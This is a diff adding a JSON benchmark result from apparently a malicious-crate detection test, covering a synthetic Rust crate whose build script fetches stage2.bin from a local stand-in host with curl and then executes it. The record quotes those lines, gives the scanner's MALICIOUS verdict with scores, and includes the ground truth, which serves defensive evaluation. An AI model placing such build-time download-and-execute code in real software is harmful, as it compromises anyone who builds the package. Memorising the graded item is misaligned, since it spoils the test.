@@ -1,0 +1,106 @@
+{
+  "crate": "cratebench-drop-curl-pipe",
+  "version": "0.1.0",
+  "condition": "structured_norag",
+  "signals": {
+    "crate": "cratebench-drop-curl-pipe",
+    "version": {
+      "version": "0.1.0",
+      "major": 0,
+      "high_major_version": false
+    },
+    "analysis_timestamp": "2026-10-07T17:30:00.626608+00:00",
+    "build_rs": {
+      "has_build_rs": true,
+      "signals": [
+        "process_spawn"
+      ],
+      "network_calls": [],
+      "file_writes": [],
+      "env_reads": [],
+      "process_spawns": [
+        "let _ = Command::new(\"curl\").arg(\"http://127.0.0.1:8000/stage2.bin\").arg(\"-o\").arg(\"/tmp/stage2\");",
+        "let _ = Command::new(\"/tmp/stage2\");"
+      ],
+      "benign_explained": {},
+      "flagged_snippets": [
+        "let _ = Command::new(\"curl\").arg(\"http://127.0.0.1:8000/stage2.bin\").arg(\"-o\").arg(\"/tmp/stage2\");",
+        "let _ = Command::new(\"/tmp/stage2\");"
+      ]
+    },
+    "unsafe_ffi": {
+      "unsafe_block_count": 0,
+      "unsafe_per_kloc": 0.0,
+      "ffi_declarations": [],
+      "syscall_usage": [],
+      "ffi_crate_dependencies": []
+    },
+    "proc_macro": {
+      "is_proc_macro": false
+    },
+    "typosquatting": {
+      "score": 0.24,
+      "target": "async-trait",
+      "edit_distance": 19,
+      "target_rank": 14,
+      "flagged": false
+    },
+    "dependencies": {
+      "count": 0,
+      "names": [],
+      "dev_dependency_count": 0,
+      "suspicious": [],
+      "suspicious_basis": null,
+      "pinned": false
+    },
+    "source_scan": {
+      "counts": {},
+      "categories": [],
+      "possible_exfiltration_shape": false,
+      "snippets": {}
+    },
+    "prompt_injection": {
+      "detected": false,
+      "matches": []
+    },
+    "content": {
+      "rust_files": 1,
+      "has_build_script": true,
+      "meaningful_lines": 6,
+      "meaningful_lines_build_script": 5,
+      "total_bytes": 203
+    }
+  },
+  "classification": {
+    "classification": "MALICIOUS",
+    "llm_classification": "MALICIOUS",
+    "reconciled": false,
+    "confidence": "HIGH",
+    "reasoning": "Purpose: The crate has no meaningful library code (6 meaningful lines total) and exists solely to execute a build script. Sources: None needed. Sinks: The build script spawns external processes using `Command::new(\"curl\")` to download a payload from a remote URL (`http://127.0.0.1:8000/stage2.bin`) directly to `/tmp/stage2`, and immediately executes it via `Command::new(\"/tmp/stage2\")`. Flow: External network resource -> local file execution at build time (cargo build). Anomalies: Downloading and executing arbitrary binaries during `build.rs` execution is a textbook supply-chain attack pattern. Conclusion: The crate is intentionally malicious.",
+    "primary_signals": [
+      "build_rs.process_spawns",
+      "build_rs.flagged_snippets"
+    ],
+    "retrieved_evidence_used": [],
+    "recommended_action": "Block",
+    "malware_score": 1.0,
+    "security_risk_score": 1.0,
+    "obfuscation_score": 0.0,
+    "confidence_score": 1.0,
+    "flagged_by_score": true,
+    "score_label_consistent": true,
+    "parse_error": false,
+    "unverified_citations": []
+  },
+  "retrieved_context": [],
+  "prescreen": null,
+  "packing": null,
+  "holdout": true,
+  "usage": {
+    "calls": 1,
+    "chars_in": 9599,
+    "chars_out": 999
+  },
+  "ground_truth": "MALICIOUS",
+  "correct": true
+}
